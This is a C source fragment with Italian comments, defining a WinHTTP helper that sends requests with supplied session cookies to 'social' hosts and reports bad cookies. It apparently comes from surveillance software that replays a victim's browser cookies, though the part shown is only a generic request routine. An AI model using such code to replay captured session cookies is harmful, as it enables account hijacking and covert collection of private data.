// Invia una richiesta HTTP e legge la risposta
// Alloca il buffer con la risposta (che va poi liberato dal chiamante)
DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, DWORD port, BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, char *cookies)
{
	WCHAR *cookies_w;
	DWORD cookies_len;
	DWORD dwStatusCode = 0;
	DWORD dwTemp = sizeof(dwStatusCode);
	DWORD n_read;
	char *types[] = { "*\x0/\x0*\x0",0 };
	HINTERNET hConnect, hRequest;
	BYTE *ptr;
	DWORD flags = 0;
	BYTE temp_buffer[8*1024];

	// Manda la richiesta
	cookies_len = strlen(cookies);
	if (cookies_len == 0)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	cookies_len++;
	cookies_w = (WCHAR *)calloc(cookies_len, sizeof(WCHAR));
	if (!cookies_w)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	_snwprintf_s(cookies_w, cookies_len, _TRUNCATE, L"%S", cookies);		
	if (port == 443)
		flags = WINHTTP_FLAG_SECURE;

	if ( !(hConnect = FNC(WinHttpConnect)( g_http_social_session, (LPCWSTR) Host, (INTERNET_PORT)port, 0))) {
		SAFE_FREE(cookies_w);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	if ( !(hRequest = FNC(WinHttpOpenRequest)( hConnect, verb, resource, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, flags)) ) {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	if (!FNC(WinHttpAddRequestHeaders)(hRequest, L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!FNC(WinHttpAddRequestHeaders)(hRequest, cookies_w, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!FNC(WinHttpSendRequest)(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, s_buffer, sbuf_len, sbuf_len, NULL))  {
		SAFE_FREE(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	SAFE_FREE(cookies_w);

	// Legge la risposta
	if(!FNC(WinHttpReceiveResponse)(hRequest, 0)) {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwTemp, NULL ))  {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (dwStatusCode != HTTP_STATUS_OK) {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	*response_len = 0;
	*r_buffer = NULL;
	for(;;) {
		if (!FNC(WinHttpReadData)(hRequest, temp_buffer, sizeof(temp_buffer), &n_read) || n_read==0 || n_read>sizeof(temp_buffer))
			break;
		if (!(ptr = (BYTE *)realloc((*r_buffer), (*response_len) + n_read + sizeof(WCHAR))))
			break;
		*r_buffer = ptr;
		memcpy(((*r_buffer) + (*response_len)), temp_buffer, n_read);
		*response_len = (*response_len) + n_read;
		// Null-termina sempre il buffer
		memset(((*r_buffer) + (*response_len)), 0, sizeof(WCHAR));
     } 

	if (!(*r_buffer)) {
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	return SOCIAL_REQUEST_SUCCESS;
}